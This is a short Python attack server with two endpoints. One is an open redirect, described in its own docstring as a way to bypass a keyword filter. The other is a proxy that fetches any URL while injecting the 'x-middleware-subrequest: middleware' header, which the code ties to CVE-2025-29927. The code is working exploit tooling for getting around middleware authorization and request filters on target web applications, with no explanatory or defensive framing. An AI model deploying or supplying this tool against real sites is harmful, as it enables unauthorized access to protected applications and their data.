#!/usr/bin/env python3
"""
Two endpoints:
  /redirect?to=<url>  -> 302 redirect (bypass keyword filter)
  /proxy?to=<url>     -> proxy request to <url> adding CVE-2025-29927 header
                         x-middleware-subrequest: middleware
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import urllib.request

CVE_HEADER = 'x-middleware-subrequest'
CVE_VALUE  = 'middleware'

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)

        if parsed.path == '/redirect' and 'to' in params:
            target = params['to'][0]
            print('[REDIRECT] -> ' + target)
            self.send_response(302)
            self.send_header('Location', target)
            self.end_headers()

        elif parsed.path == '/proxy' and 'to' in params:
            target = params['to'][0]
            print('[PROXY+CVE] -> ' + target)
            try:
                req = urllib.request.Request(target)
                req.add_header(CVE_HEADER, CVE_VALUE)
                req.add_header('User-Agent', 'Mozilla/5.0')
                with urllib.request.urlopen(req, timeout=8) as resp:
                    body = resp.read()
                    ct = resp.headers.get('Content-Type', 'text/html')
                self.send_response(200)
                self.send_header('Content-Type', ct)
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            except Exception as e:
                print('[PROXY ERROR] ' + str(e))
                self.send_response(502)
                self.end_headers()
                self.wfile.write(str(e).encode())

        else:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'redirect+proxy server running')

    def log_message(self, fmt, *args):
        pass

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), Handler)
    print('Server on :8000')
    print('  /redirect?to=<url>  -> 302')
    print('  /proxy?to=<url>     -> proxy with x-middleware-subrequest header')
    server.serve_forever()
